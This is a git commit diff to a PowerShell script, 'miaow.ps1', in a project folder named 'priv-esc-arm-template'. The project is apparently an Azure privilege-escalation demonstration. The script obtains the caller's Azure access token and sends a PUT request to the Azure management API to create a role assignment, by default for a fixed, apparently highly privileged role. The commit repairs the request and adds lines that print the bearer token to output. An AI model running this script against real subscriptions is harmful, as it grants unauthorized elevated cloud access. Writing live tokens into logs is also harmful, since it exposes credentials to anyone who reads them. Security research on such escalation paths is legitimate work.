603fe957596c3e718f8956c786a575c685be106c
Rogier Dijkman <40334679+azurekid@users.noreply.github.com>
2023-07-07 16:47:18 +0200

    Update miaow.ps1

--- priv-esc-arm-template/miaow.ps1
+++ priv-esc-arm-template/miaow.ps1
@@ -10,13 +10,10 @@ param (
     [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
 )
 
-Write-Host "##[debug] Generating Access Token"
 $token = (Get-AzAccessToken).token
-$token
-
+$headers = @{"Authorization"="Bearer $token"}
 $guid = (New-Guid).Guid
 
-Write-Host "##[debug] Generating Payload"
 $payload = @{
     properties = @{
         roleDefinitionId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/$roleDefinition"
@@ -25,17 +22,16 @@ $payload = @{
     }
 } | ConvertTo-Json -Depth 10 -Compress
 
-Write-Host "##[debug] Generating URI"
 $uri = "https://management.azure.com/subscriptions/$($subscriptionId)/providers/Microsoft.Authorization/roleAssignments/$($guid)?api-version=2022-04-01"
-write-host $payload
-write-host $uri
 
-Write-Host "##[debug] Creating Assignment URI"
 $result = Invoke-RestMethod `
     -uri $uri `
-    -body $payload
-    -contenttype 'application/json' `
-    -method 'PUT'
-    -headers @{"Authorization" = "Bearer $token"}
+    -Body $payload `
+    -ContentType 'application/json' `
+    -Method 'PUT' `
+    -headers $headers
 
-write-output $result
+Write-Host "token: [$token]"
+Write-Host "payload: [$payload]"
+Write-Host "URI: [$uri]"
+write-host "Result: $result"
